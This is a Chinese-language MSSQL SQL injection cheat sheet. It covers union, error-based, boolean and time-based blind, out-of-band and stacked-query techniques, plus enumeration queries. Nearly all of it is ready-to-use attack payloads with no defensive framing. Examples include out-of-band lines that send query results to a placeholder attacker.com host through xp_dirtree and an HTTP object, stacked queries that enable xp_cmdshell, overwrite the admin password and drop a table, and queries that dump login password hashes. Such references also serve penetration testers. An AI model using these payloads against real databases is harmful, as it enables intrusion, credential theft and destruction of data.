## 联合注入

```sql
SELECT user UNION SELECT @@version
SELECT user UNION (SELECT @@version)
SELECT user,system_user UNION (SELECT @@version,null)
SELECT * FROM yourtable ORDER BY [numberOfColumns]
SELECT @@version; SELECT @@version --
```

## 报错注入

```sql
SELECT convert(int,(SELECT @@version))
SELECT cast((SELECT @@version) as int)
SELECT 1/@@version
```

|描述|查询语句|
|----|----|
|注入到当前查询中|SELECT CAST(@@version as int)|
|显示系统用户|SELECT CAST(SYSTEM_USER as int);|
|使用xml路径在一行中显示所有数据库|SELECT CAST((SELECT name,',' FROM master..sysdatabases FOR XML path('')) as int) SELECT CAST((SELECT name AS "data()" FROM master..sysdatabases FOR xml path('')) AS int);|
|显示服务器名称|SELECT CAST(@@SERVERNAME as int);|
|显示服务名称|SELECT CAST(@@SERVICENAME as int);|
|显示数据库|DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = ''; SELECT @listStr = @listStr + Name + ',' FROM master..sysdatabases; SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);|
|列出表|DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..sysobjects WHERE type = 'U'; SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);|
|显示列|DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = ''; SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..syscolumns WHERE id=object_id('MYTABLE'); SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);|
|显示列值(将MYCOLUMN替换为*以选择所有列)|DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = ''; SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..syscolumns WHERE id=object_id('MYTABLE'); SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);|
|一次显示一个库名(增加TOP值可以获取下一条)|SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC|

## 盲注

布尔盲注
```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -

AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64--
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'

AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90

SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'

WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

时间盲注
```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--

IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02
```

OOB
```sql
'; DECLARE @myvar NVARCHAR(1024); SELECT @myvar = (SELECT TOP 1 name FROM sysobjects); EXEC('master..xp_dirtree ''http://'+@myvar+'.attacker.com''');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
'; EXEC sp_oacreate 'MSXML2.XMLHTTP', @object OUT; EXEC sp_oamethod @object, 'open', NULL, 'GET', ('http://attacker.com/?data=' + (SELECT @@version)), false; EXEC sp_oamethod @object, 'send'; --
```

## 堆叠查询
```sql
-- multiple SELECT statements
SELECT 'A'SELECT 'B'SELECT 'C'

-- updating password with a stacked query
SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

-- using the stacked query to enable xp_cmdshell
-- you won't have the output of the query, redirect it to a file
SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--

ProductID=1; DROP members--
```

## 查询语句

查看用户
```sql
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;
```

查看版本
```sql
SELECT @@version
```

主机名
```sql
SELECT HOST_NAME()
SELECT @@hostname
SELECT @@SERVERNAME
SELECT SERVERPROPERTY('productversion')
SELECT SERVERPROPERTY('productlevel')
SELECT SERVERPROPERTY('edition');
```

库名
```sql
SELECT DB_NAME()
```

数据库凭据
```sql
SELECT name, password FROM master..sysxlogins
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
-- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
SELECT name, password_hash FROM master.sys.sql_logins
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

列出数据库
```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); — for N = 0, 1, 2, …
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
```

列
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, column_name FROM information_schema.columns
```

表
```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable

SELECT table_catalog, table_name FROM information_schema.columns
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
```
